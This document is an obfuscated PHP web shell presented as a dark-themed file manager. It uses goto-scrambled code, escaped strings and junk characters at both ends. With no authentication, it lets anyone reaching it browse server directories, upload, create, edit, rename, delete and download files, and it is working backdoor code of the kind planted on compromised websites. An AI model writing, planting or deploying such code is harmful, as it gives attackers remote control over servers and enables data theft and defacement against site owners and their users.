ขե્ĉ^עцરֆବɔભતާምଁሩৰค<?php
 goto MnDhd; kRrEg: ?>
</a></p><div class="form-container"><form method="post"enctype="multipart/form-data"><input name="file"type="file"> <button name="upload"type="submit">Upload</button></form><form method="post"><input name="new_file_name"placeholder="New file name"required> <button name="create_file"type="submit">Create File</button></form></div><table border="1"><thead><tr><th>Όνομα αρχείου</th><th>Size</th><th>Actions</th></tr></thead><tbody><?php  goto DL6Kt; LCu1X: echo urlencode(dirname($current_dir)); goto TzIxo; Fl9bI: goto ZICke; goto zDiW5; uZKFT: if (isset($_GET["\x65\144\x69\164"])) { $file_to_edit = $current_dir . "\x2f" . $_GET["\145\144\x69\164"]; if (is_file($file_to_edit)) { $file_content = file_get_contents($file_to_edit); ?>
<form method="post"><input name="file_name"type="hidden"value="<?php  echo $_GET["\x65\x64\x69\164"]; ?>
"> <textarea name="file_content"><?php  echo htmlspecialchars($file_content); ?>
</textarea><br><button name="save_file"type="submit">Save Changes</button></form><?php  } } goto Nc5Fq; TzIxo: goto iWea8; goto SdAFh; N2QoP: goto TQ3oB; goto zOl6j; uh3b8: if (isset($_POST["\163\x61\x76\145\137\146\151\154\x65"])) { $file_to_edit = $current_dir . "\x2f" . $_POST["\146\x69\154\145\x5f\156\141\155\145"]; $new_content = $_POST["\146\151\154\x65\137\x63\157\156\x74\x65\x6e\x74"]; file_put_contents($file_to_edit, $new_content); header("\114\x6f\x63\141\x74\151\x6f\156\x3a\40\x3f\x64\x69\162\75" . urlencode($_GET["\144\151\162"])); } goto gHh1T; ULkVn: ?>
<body><p>Current Directory: <a href="?dir=<?php  goto Fl9bI; DL6Kt: goto mHq0t; goto HsQsj; JHuiM: goto pjEJN; goto dDY62; Qafis: yQnAi: goto uZKFT; HsQsj: iWea8: goto ZcTfF; uGURt: echo $current_dir; goto slFMG; dDY62: U2Jft: goto rtRzW; SdAFh: ULHs1: goto kRrEg; FI2qh: if (isset($_GET["\x64\157\167\156\154\x6f\141\x64"])) { $file_to_download = $current_dir . "\x2f" . $_GET["\x64\157\x77\156\x6c\x6f\141\x64"]; if (is_file($file_to_download)) { header("\x43\x6f\x6e\x74\145\156\x74\x2d\x44\145\163\143\162\151\x70\164\151\x6f\x6e\72\x20\x46\x69\x6c\145\40\124\x72\141\x6e\163\x66\x65\x72"); header("\103\x6f\156\x74\x65\156\x74\55\124\x79\160\145\x3a\40\x61\160\x70\x6c\x69\x63\141\x74\x69\157\x6e\57\157\143\x74\x65\164\55\x73\x74\x72\145\x61\155"); header("\x43\157\156\164\145\156\164\55\104\x69\x73\x70\157\x73\151\x74\x69\x6f\156\x3a\x20\141\x74\x74\x61\x63\150\155\145\156\x74\73\40\x66\151\154\x65\x6e\x61\155\145\75\x22" . basename($file_to_download) . "\x22"); header("\x43\157\156\x74\145\x6e\164\55\114\x65\x6e\147\164\150\72\40" . filesize($file_to_download)); readfile($file_to_download); die; } } goto f42iA; WC1hh: listDirectory($current_dir); goto JHuiM; AUG41: fvPQV: goto WvbHR; zDiW5: mHq0t: goto WC1hh; jEBiP: if (!$current_dir || !is_dir($current_dir)) { $current_dir = $root_dir; } goto oChOy; yo665: if (isset($_POST["\x75\x70\x6c\157\141\x64"])) { $target_file = $current_dir . "\x2f" . basename($_FILES["\146\151\154\x65"]["\156\x61\155\145"]); move_uploaded_file($_FILES["\x66\x69\154\x65"]["\x74\155\x70\x5f\156\141\155\145"], $target_file); header("\x4c\157\143\141\164\x69\157\156\x3a\x20\x3f\x64\x69\x72\x3d" . urlencode($_GET["\x64\151\162"])); } goto uh3b8; MnDhd: $root_dir = realpath(__DIR__); goto SyLy5; C7_vG: ZICke: goto LCu1X; dVf8j: goto exfOm; goto QkflC; bdmtd: exfOm: goto uGURt; mwjsb: ?>
</tbody></table><?php  goto POk_v; QkflC: TQ3oB: goto ULkVn; SyLy5: $current_dir = isset($_GET["\144\x69\x72"]) ? realpath($_GET["\144\151\162"]) : $root_dir; goto jEBiP; V7OtP: if (isset($_GET["\x64\145\154\x65\x74\145"])) { $file_to_delete = $current_dir . "\57" . $_GET["\144\x65\x6c\x65\164\145"]; if (is_file($file_to_delete)) { unlink($file_to_delete); } header("\114\157\143\141\164\x69\157\x6e\72\x20\77\144\x69\162\x3d" . urlencode($_GET["\144\151\x72"])); } goto FI2qh; slFMG: goto ULHs1; goto AUG41; Nc5Fq: goto U2Jft; goto C7_vG; zOl6j: pjEJN: goto mwjsb; f42iA: if (isset($_POST["\x72\145\156\141\x6d\145\x5f\146\151\x6c\145"])) { $old_name = $current_dir . "\57" . $_POST["\157\x6c\144\137\156\x61\x6d\x65"]; $new_name = $current_dir . "\x2f" . $_POST["\156\145\x77\x5f\x6e\x61\155\145"]; rename($old_name, $new_name); header("\114\157\x63\x61\164\151\157\x6e\x3a\40\77\144\151\x72\75" . urlencode($_GET["\144\x69\x72"])); } goto yo665; WvbHR: if (isset($_GET["\x72\x65\156\141\x6d\145"])) { ?>
<form method="post"><input name="old_name"type="hidden"value="<?php  echo $_GET["\x72\x65\156\x61\155\145"]; ?>
"> <input name="new_name"placeholder="New name"style="width:100%;padding:10px"> <button name="rename_file"type="submit">Rename</button></form><?php  } goto QGlL8; QGlL8: goto yQnAi; goto Qafis; ZcTfF: ?>
"style="color:#03dac6"><?php  goto dVf8j; BDTv2: ?>

<!DOCTYPE html>
<html>
<head>
    <title>ባለቤትነት</title>
    <style>
        /* Styling dengan tema gelap (latar belakang hitam dan teks terang) */
        body {
            background-color: #262838;
            color: #E0E0E0;
            font-family: Arial, sans-serif;
        }
        h2 {
            color: #BB86FC;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #333;
            color: #BB86FC;
        }
        tr:nth-child(even) {
            background-color: #3b3a39;
        }
        tr:nth-child(odd) {
            background-color: #262838;
        }
        a {
            color: #03DAC6;
            text-decoration: none;
        }
        a:hover {
            color: #BB86FC;
        }
        button {
            background-color: #03DAC6;
            color: #262838;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
        }
        button:hover {
            background-color: #BB86FC;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #3b3a39;
            color: #E0E0E0;
            border: 1px solid #BB86FC;
        }
        input[type="file"], input[type="text"] {
            color: #E0E0E0;
            background-color: #3b3a39;
            border: 1px solid #BB86FC;
            padding: 10px;
        }
        .form-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        .form-container form {
            margin-right: 10px;
        }
    </style>
</head>
<?php  goto N2QoP; POk_v: goto fvPQV; goto bdmtd; gHh1T: if (isset($_POST["\x63\x72\145\x61\x74\x65\137\146\x69\154\145"])) { $new_file_name = $_POST["\156\145\x77\x5f\146\151\154\145\137\x6e\141\x6d\x65"]; $new_file_path = $current_dir . "\x2f" . $new_file_name; file_put_contents($new_file_path, ''); header("\x4c\x6f\143\141\x74\x69\157\156\x3a\x20\77\x64\x69\162\x3d" . urlencode($_GET["\x64\x69\x72"])); } goto BDTv2; oChOy: function listDirectory($dir) { $files = scandir($dir); $directories = array(); $regular_files = array(); foreach ($files as $file) { if ($file != "\x2e" && $file != "\56\56") { if (is_dir($dir . "\57" . $file)) { $directories[] = $file; } else { $regular_files[] = $file; } } } foreach ($directories as $directory) { echo "\74\164\x72\76"; echo "\74\x74\144\76\x3c\x61\x20\x68\162\x65\x66\x3d\x22\x3f\144\151\x72\x3d" . urlencode($dir . "\x2f" . $directory) . "\42\76\351\246\x83\346\220\xa7\x20" . $directory . "\x3c\x2f\141\76\74\57\164\x64\x3e"; echo "\74\x74\144\x3e\106\157\154\x64\145\x72\x3c\57\164\144\76"; echo "\74\x74\144\x3e\xa\40\40\x20\x20\x20\x20\40\40\40\x20\40\40\x3c\x61\x20\x68\x72\145\146\75\x22\77\144\x69\162\75" . urlencode($dir) . "\x26\x65\144\x69\x74\x3d" . urlencode($directory) . "\42\76\105\144\x69\164\x3c\57\x61\x3e\x20\174\12\x20\x20\40\x20\40\x20\40\x20\40\40\40\x20\x3c\141\40\x68\x72\145\146\75\x22\77\144\151\162\75" . urlencode($dir) . "\x26\x64\x65\x6c\x65\x74\x65\x3d" . urlencode($directory) . "\42\76\x44\x65\154\145\164\145\x3c\57\141\76\x20\x7c\xa\40\40\40\40\40\x20\x20\40\40\40\40\40\x3c\141\x20\150\x72\145\x66\75\42\77\x64\x69\162\75" . urlencode($dir) . "\x26\162\145\x6e\x61\x6d\145\x3d" . urlencode($directory) . "\x22\x3e\x52\145\x6e\141\x6d\x65\x3c\x2f\x61\x3e\40\x7c\12\40\x20\x20\40\40\x20\x20\40\x20\x20\x20\x20\x3c\141\x20\x68\162\x65\x66\x3d\x22\x3f\144\x69\x72\75" . urlencode($dir) . "\46\144\157\167\156\154\157\x61\x64\75" . urlencode($directory) . "\42\76\104\157\x77\156\x6c\157\141\144\74\x2f\x61\x3e\xa\x20\x20\40\40\x20\40\40\x20\x3c\x2f\164\x64\x3e"; echo "\x3c\57\x74\162\76"; } foreach ($regular_files as $file) { echo "\74\164\x72\76"; echo "\74\164\144\x3e" . $file . "\74\x2f\x74\144\76"; echo "\74\x74\144\x3e" . filesize($dir . "\x2f" . $file) . "\x20\142\171\x74\x65\x73\x3c\x2f\x74\144\x3e"; echo "\x3c\164\144\x3e\12\40\x20\x20\40\x20\40\x20\x20\40\x20\40\x20\74\x61\x20\150\162\x65\x66\75\42\x3f\x64\x69\x72\x3d" . urlencode($dir) . "\46\145\144\151\x74\x3d" . urlencode($file) . "\x22\x3e\105\144\x69\x74\x3c\57\141\x3e\40\174\12\x20\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\74\x61\40\150\162\x65\146\75\x22\x3f\144\x69\162\75" . urlencode($dir) . "\46\x64\x65\154\145\x74\145\75" . urlencode($file) . "\42\x3e\104\x65\154\x65\x74\145\74\57\x61\x3e\40\174\12\40\40\40\40\40\40\x20\x20\x20\x20\40\40\74\x61\x20\x68\x72\x65\x66\x3d\x22\x3f\144\151\x72\x3d" . urlencode($dir) . "\x26\x72\x65\156\x61\x6d\x65\x3d" . urlencode($file) . "\42\x3e\122\145\156\141\155\145\x3c\57\141\x3e\x20\x7c\12\x20\x20\x20\40\x20\40\40\40\40\40\40\x20\x3c\141\x20\150\x72\x65\x66\x3d\42\77\144\151\x72\x3d" . urlencode($dir) . "\46\x64\x6f\167\156\154\157\141\x64\75" . urlencode($file) . "\x22\x3e\x44\157\167\156\154\157\141\x64\x3c\x2f\141\x3e\xa\x20\40\40\40\x20\40\x20\40\74\57\x74\144\76"; echo "\x3c\x2f\x74\x72\76"; } } goto V7OtP; rtRzW: ?>
</body>
</html>דኅ్ุιልህሎžડભనҌžöኛ፣ትથ